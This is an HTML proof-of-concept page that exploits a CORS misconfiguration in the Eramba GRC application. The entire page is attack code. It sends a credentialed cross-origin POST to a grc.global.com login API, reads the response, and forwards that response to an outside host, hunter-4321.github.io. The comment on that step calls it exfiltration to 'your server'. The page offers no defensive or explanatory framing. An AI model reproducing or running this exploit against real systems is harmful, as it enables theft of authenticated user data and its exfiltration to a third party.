<!DOCTYPE html>
<html>
<head>
  <title>Eramba CORS PoC (XHR Style)</title>
</head>
<body>
  <h2>Eramba CORS Exploit Demo (XHR)</h2>
  <button onclick="exploit()">Exploit via XMLHttpRequest</button>

  <script>
    function exploit() {
      var req = new XMLHttpRequest();
      req.onload = function() {
        alert("Response from grc.global.com:\n\n" + this.responseText);

        // Optional: Exfiltrate to your server
        var exfil = new XMLHttpRequest();
        exfil.open("POST", "https://hunter-4321.github.io", true);
        exfil.setRequestHeader("Content-Type", "application/json");
        exfil.send(JSON.stringify({ response: this.responseText }));
      };

      req.open("POST", "https://grc.global.com/system-api/login", true);
      req.withCredentials = true;
      req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      req.send("login=asdf&password=asdf");
    }
  </script>
</body>
</html>
